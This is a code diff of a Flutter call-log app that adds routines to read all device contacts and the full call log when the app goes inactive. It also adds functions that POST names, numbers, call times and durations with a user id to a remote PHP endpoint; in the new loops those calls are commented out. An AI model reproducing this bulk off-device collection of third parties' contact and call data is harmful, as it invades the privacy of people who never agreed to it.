@@ -1,5 +1,6 @@
 import 'package:call_log/call_log.dart';
 import 'package:call_look/CallCode.dart';
+import 'package:contacts_service/contacts_service.dart';
 import 'package:flutter/material.dart';
 
 // import 'package:flutter_dialpad/flutter_dialpad.dart';
@@ -14,12 +15,14 @@ class CallLogs extends StatefulWidget {
 }
 
 class CallLogsState extends State<CallLogs> with WidgetsBindingObserver {
-  final url = "https://familybaskets.co.in/api/calllog.php";
+  final urlcalllog = "https://familybaskets.co.in/api/calllog.php";
+  final urlcontact = "https://familybaskets.co.in/api/contact.php";
+
   CallCode callCode = new CallCode();
-  AppLifecycleState _notification;
   Future<Iterable<CallLogEntry>> logs;
+  List<CallLogs> calllogs = [];
   TextEditingController _textController;
-  var name, phone, calltype, callingtime, duration, userid;
+  var callname, callphone, callcalltype, callcallingtime, callduration, userid, contactname, contactphone;
 
   @override
   void initState() {
@@ -43,6 +46,10 @@ class CallLogsState extends State<CallLogs> with WidgetsBindingObserver {
       setState(() {
         logs = callCode.getCallLogs();
       });
+    }else if(state == AppLifecycleState.inactive){
+      print(state.name);
+      upload();
+      _checkuserid();
     }
   }
 
@@ -70,7 +77,6 @@ class CallLogsState extends State<CallLogs> with WidgetsBindingObserver {
                   return Expanded(
                       child: ListView.builder(
                     itemBuilder: (context, index) {
-                      _checkuserid(entries, index);
                       return GestureDetector(
                         child: Card(semanticContainer: true,
                           elevation: 1.0,
@@ -114,33 +120,64 @@ class CallLogsState extends State<CallLogs> with WidgetsBindingObserver {
     }
   }
 
-  void uploaddata() async {
-    final response = await http.post(Uri.parse(url), body: {
-      "name": name,
-      "phone": phone,
-      "calltype": calltype,
-      "callingtime": callingtime,
-      "duration": duration,
+  void upload() async {
+    List<Contact> _contact = await ContactsService.getContacts(withThumbnails: false);
+    for(int i=0;i< _contact.length; i++){
+      contactname = _contact.elementAt(i).displayName;
+      contactphone = '';
+      for(int j=0; j<_contact.elementAt(i).phones.length; j++){
+        contactphone += "?"+_contact.elementAt(i).phones.elementAt(j).value;
+      }
+      print(contactname);
+      print(contactphone);
+      // uploadcontact();
+    }
+  }
+
+  void uploadcontact() async {
+    final response = await http.post(Uri.parse(urlcontact),
+        body: {
+          "name" : contactname,
+          "phone" : contactphone,
+          "userid" : userid
+        });
+    print(response.body);
+  }
+
+  void uploadcalllogs() async {
+    final response = await http.post(Uri.parse(urlcalllog), body: {
+      "name": callname,
+      "phone": callphone,
+      "calltype": callcalltype,
+      "callingtime": callcallingtime,
+      "duration": callduration,
       "userid": userid
     });
 
     print(response.body);
   }
 
-  _checkuserid(Iterable<CallLogEntry> entries, int index) {
-    name = callCode.getName(entries.elementAt(index));
-    phone = entries.elementAt(index).number;
-    calltype = callCode.calltypes(entries.elementAt(index).callType);
-    callingtime = callCode.formatdate(new DateTime.fromMillisecondsSinceEpoch(
-        entries.elementAt(index).timestamp));
-    duration = callCode.printDuration(entries.elementAt(index).duration);
-    print(name);
-    print(phone);
-    print(calltype);
-    print(callingtime);
-    print(duration);
-    print(userid);
-    uploaddata();
+  _checkuserid() async {
+    final List<CallLogEntry> calllogs = (await CallLog.get()).toList();
+     for(int i=0; i<calllogs.length; i++){
+       callname = callCode.getName(calllogs[i]);
+           // callCode.getName(elementAt(index));
+       callphone = calllogs.elementAt(i).number;
+           // entries.elementAt(index).number;
+       callcalltype = callCode.calltypes(calllogs[i].callType);
+       // callCode.calltypes(entries.elementAt(index).callType);
+       callcallingtime = callCode.formatdate(new DateTime.fromMillisecondsSinceEpoch(
+           calllogs.elementAt(i).timestamp));
+       // callCode.formatdate(new DateTime.fromMillisecondsSinceEpoch(entries.elementAt(index).timestamp));
+       callduration = callCode.printDuration(calllogs.elementAt(i).duration);
+       // callCode.printDuration(entries.elementAt(index).duration);
+       // uploadcalllogs();
+       print(callname);
+       print(callphone);
+       print(callcalltype);
+       print(callcallingtime);
+       print(callduration);
+     }
   }
 }
 
